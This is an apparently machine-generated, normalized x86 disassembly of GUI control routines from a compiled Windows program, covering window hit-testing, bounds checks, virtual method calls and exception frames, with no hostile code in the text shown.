jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_457424
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403368
sub_44157c
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_43fde8
mov edx edi
xor ecx ecx
mov eax ebx
call sub_441544
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406cd8
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403368
sub_4415f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_441544
pop esi
pop ebx
retn
sub_441614
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_441544
pop esi
pop ebx
retn
sub_441634
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_457424
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403368
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_44adc8
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44168c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43fdd8
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_43fde8
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_440d98
pop esi
retn
sub_4416cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_440dcc
sub_44177a
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_43fff8
mov cl 0x1
sub_4417bc
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_43fd50
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43fd50
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_4417ec
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_441810
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406cd8
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403368
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_440d98
mov [ ebx + 0xc ] eax
sub_4418b4
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_43fca4
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43fca4
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_441948
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_4030b4
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_43f344
mov edx [ esp ]
mov eax esi
call sub_43f320
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_43f5cc
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_43f610
sub_4419cc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_416a38
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_43f6c8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_416a88
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43f570
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441a58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_441948
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_446450
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_4419cc
pop ecx
jmp r-xdata
sub_441ab8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_441ba6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441bad
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_43fbe0
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43fbb0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43fbb0
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_40434c
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403f94
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_43fad0
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_441bb4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403368
sub_441be0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_441c00
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_441c20
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_441c40
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_441c60
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_441c80
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_441ca0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41eb28
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_43f204
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403368
sub_441cd8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_441d74
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41858c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_44c36c
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44c4a4
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43fbb0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44c204
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_44c5c4
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441d7b
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_441d84
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_441dc0
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_441d84
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_441e70
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_4032f8
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_441ea4
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_441ec4
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403368
test al al
je r-xdata
mov eax edi
call sub_441f04
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_441f30
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_441f5c
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406cd8
mov eax esp
call sub_416ab0
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43f6f4
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403368
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403368
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_43f720
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_416ab0
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_416a38
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_43f6c8
sub_442084
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_4420c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e8f4
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_4420f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_4421f0
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_43ecb0
push ebx
push sub_443b88
call sub_41f768
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422050
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_4221f8
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_403490
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e2ec
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403f94
lea eax [ ebx + 0x188 ]
call sub_403f40
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4421f7
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
sub_4421f7
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_44221c
push ebx
push esi
push edi
call sub_4034f8
mov ebx edx
mov edi eax
mov eax edi
call sub_41e978
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_4058d0
mov eax [ edi + 0x178 ]
call sub_40316c
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_43d85c
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_442ebc
mov eax edi
call sub_4430fc
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_40316c
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_4430c0
mov esi eax
mov edx esi
mov eax edi
call sub_442f28
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_4430fc
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_43ed88
test bl bl
jle r-xdata
call sub_41f800
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034e0
sub_4422ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_4423b0
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41808c
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40316c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_446610
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_417e94
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_417fe0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_417e94
test eax eax
je r-xdata
sub_4423c0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_442c64
xor eax eax
push ebp
push sub_442400
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43efec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442407
mov eax [ ebp - 0x4 ]
call sub_442c6c
retn
sub_442407
mov eax [ ebp - 0x4 ]
call sub_4422ec
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_443ac0
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_440d98
sub_44243c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_442457 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_4424c8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_446754
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_416a38
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
